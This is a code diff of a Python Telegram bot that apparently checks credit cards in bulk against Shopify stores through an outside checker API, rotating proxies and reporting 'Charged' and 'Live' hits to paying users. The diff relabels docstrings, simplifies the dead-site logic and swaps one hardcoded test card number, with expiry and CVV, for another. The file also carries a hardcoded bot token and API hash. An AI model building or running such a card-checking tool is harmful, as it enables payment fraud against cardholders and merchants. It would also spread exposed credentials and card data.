@@ -9,7 +9,7 @@ import json
 import re
 from datetime import datetime
 
-# Direct API endpoint (replaces checker_bridge)
+# Direct API endpoint (replaces checker_bridge) - Updated from Bot 2
 CHECKER_API_URL = 'https://afuonax.up.railway.app/shopify_parallel'
 
 # Premium Custom Emoji IDs (bot must be created with Telegram Premium account)
@@ -50,7 +50,6 @@ API_ID = 39825025
 API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
 BOT_TOKEN = '8827673793:AAHKJphZzbQwOKBZS2pHLTDekPvYUrsJT6Y'
 
-
 # File paths
 PREMIUM_FILE = 'premium.txt'
 SITES_FILE = 'sites.txt'
@@ -62,27 +61,6 @@ bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 # Store active checking sessions
 active_sessions = {}
 
-# Dead site error keywords
-_DEAD_INDICATORS = (
-    'receipt id is empty', 'handle is empty', 'product id is empty',
-    'tax amount is empty', 'payment method identifier is empty',
-    'invalid url', 'error in 1st req', 'error in 1 req',
-    'cloudflare', 'connection failed', 'timed out',
-    'access denied', 'tlsv1 alert', 'ssl routines',
-    'could not resolve', 'domain name not found',
-    'name or service not known', 'openssl ssl_connect',
-    'empty reply from server', 'httperror504', 'http error',
-    'timeout', 'unreachable', 'ssl error',
-    '502', '503', '504', 'bad gateway', 'service unavailable',
-    'gateway timeout', 'network error', 'connection reset',
-    'failed to detect product', 'failed to create checkout',
-    'failed to tokenize card', 'failed to get proposal data',
-    'submit rejected', 'submit rejected:','handle error', 'http 404',
-    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
-    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
-    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
-    'all products sold out', 'no_session_token', 'tokenize_fail',
-)
 # --- UPDATED LOADING FUNCTIONS ---
 def get_file_lines(filepath):
     """Helper to read lines from a file fresh every time"""
@@ -122,13 +100,17 @@ def extract_cc(text):
     return cards
 
 def is_site_dead(response_msg, gateway, price):
+    """Check if error indicates dead site (From Bot 2 to save proxies)"""
     if not response_msg:
         return True
+    
     if not gateway or gateway == "Unknown":
         return True
+    
     price_str = str(price)
     if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
         return True
+    
     return False
 
 async def get_bin_info(card_number):
@@ -156,7 +138,7 @@ async def get_bin_info(card_number):
         return '-', '-', '-', '-', '-', ''
 
 async def check_card(card, site, proxy):
-    """Check a single card against a site using the direct checker API"""
+    """Check a single card against a site using the parallel checker API (From Bot 2)"""
     try:
         parts = card.split('|')
         if len(parts) != 4:
@@ -180,12 +162,13 @@ async def check_card(card, site, proxy):
         url = f'{CHECKER_API_URL}?site={site}&cc={card}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
-        
+
         timeout = aiohttp.ClientTimeout(total=100)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as resp:
                 if resp.status != 200:
                     return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
+                
                 try:
                     raw = await resp.json()
                 except:
@@ -196,7 +179,8 @@ async def check_card(card, site, proxy):
         price = raw.get('Price', '-')
         if price != '-' and price != 0:
             price = f"${price}"
-        gateway = raw.get('Gateway', 'Shopify Payments')
+        gateway = raw.get('Gateway', 'Shopify')
+        status_api = raw.get('Status', False)
 
         if is_site_dead(response_msg, gateway, price):
             return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
@@ -254,7 +238,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}
 
 async def send_realtime_hit(user_id, result, hit_type, username):
-    """Send real-time notification with new design"""
+    """Send real-time notification with Bot 1 original design"""
     emoji = "✅" if hit_type == "Charged" else "🔥"
     status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"
 
@@ -277,9 +261,8 @@ async def send_realtime_hit(user_id, result, hit_type, username):
     except:
         pass
 
-
 async def update_progress(user_id, message_id, results, current_attempt_count):
-    """Update progress message with new design"""
+    """Update progress message with Bot 1 original design"""
     elapsed = int(time.time() - results['start_time'])
     hours = elapsed // 3600
     minutes = (elapsed % 3600) // 60
@@ -307,7 +290,7 @@ async def update_progress(user_id, message_id, results, current_attempt_count):
         pass
 
 async def send_final_results(user_id, results):
-    """Send final results with txt file and new design"""
+    """Send final results with txt file and Bot 1 original design"""
     elapsed = int(time.time() - results['start_time'])
     hours = elapsed // 3600
     minutes = (elapsed % 3600) // 60
@@ -318,7 +301,7 @@ async def send_final_results(user_id, results):
     if results['charged']:
         for r in results['charged'][:5]:
             hits_text += f"✅ <code>{r['card']}</code>\n"
-    if Defense := results['approved']:
+    if results['approved']:
         for r in results['approved'][:5]:
             hits_text += f"🔥 <code>{r['card']}</code>\n"
 
@@ -376,8 +359,8 @@ async def send_final_results(user_id, results):
         pass
 
 async def test_site(site, proxy):
-    """Test a single site using the direct checker API with a test card"""
-    test_card = "5154623245618097|03|2032|156"
+    """Test a single site using the API (From Bot 2)"""
+    test_card = "4031630422575208|01|2030|280"
     try:
         if not site.startswith('http'):
             site = f'https://{site}'
@@ -418,7 +401,7 @@ async def test_site(site, proxy):
         return {'site': site, 'status': 'dead'}
 
 async def test_proxy(proxy):
-    """Test a single proxy using the direct checker API with a test card and site"""
+    """Test a single proxy (From Bot 2 to save proxies by only checking shopify.com)"""
     try:
         proxy_parts = proxy.split(':')
         if len(proxy_parts) == 4:
@@ -946,7 +929,7 @@ async def check_command(event):
 
 @bot.on(events.NewMessage(pattern='/proxy'))
 async def proxy_command(event):
-    """Check all proxies and remove dead ones using a test card and site"""
+    """Check all proxies and remove dead ones using a safe test logic"""
     user_id = event.sender_id
 
     if not is_premium(user_id):
